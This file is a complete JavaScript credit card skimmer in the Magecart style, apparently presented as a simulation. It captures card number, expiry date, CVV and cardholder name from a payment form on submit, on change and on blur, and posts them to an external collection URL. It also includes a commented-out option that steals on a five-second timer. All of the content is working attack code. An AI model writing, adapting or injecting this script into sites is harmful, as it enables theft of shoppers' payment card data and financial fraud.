// evilhacker.js (https://evilhacker.edgecompute.app/static-asset/evilhacker.js)
(function() {
    // Function to steal card data
    function stealCardData() {
        const form = document.getElementById('credit-card-form');
        if (form) {
            const cardData = {
                card_number: form.card_number.value,
                expiry_month: form.expiry_month.value,
                expiry_year: form.expiry_year.value,
                cvv: form.cvv.value,
                cardholder_name: form.cardholder_name.value
            };

            // Send the stolen data to the attacker's server (replace with attacker's actual URL)
            fetch('https://evilhacker.edgecompute.app/anything/steal', {  // IMPORTANT: Change this URL
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cardData),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send stolen data:', response.status);
                }
            })
            .catch(error => console.error('Error sending stolen data:', error));
        }
    }

    // Method 1: Steal data on form submission (most common Magecart approach)
    const form = document.getElementById('credit-card-form');
    if (form) {
        form.addEventListener('submit', stealCardData);
    }

     //Method 2 (Less Common, but Illustrative): Steal on Input Change
      const inputs = document.querySelectorAll('#credit-card-form input, #credit-card-form select');
      inputs.forEach(input => {
        input.addEventListener('change', stealCardData);
        input.addEventListener('blur', stealCardData);
      });


    // Method 3:  Periodically steal data (demonstrates persistence, less common in Magecart)
    // setInterval(stealCardData, 5000); // Steal every 5 seconds (adjust as needed)
    //Commented out by default. This is EXTREMELY aggressive.

    console.log("evilhacker.js loaded - Magecart attack simulation active.");
})();
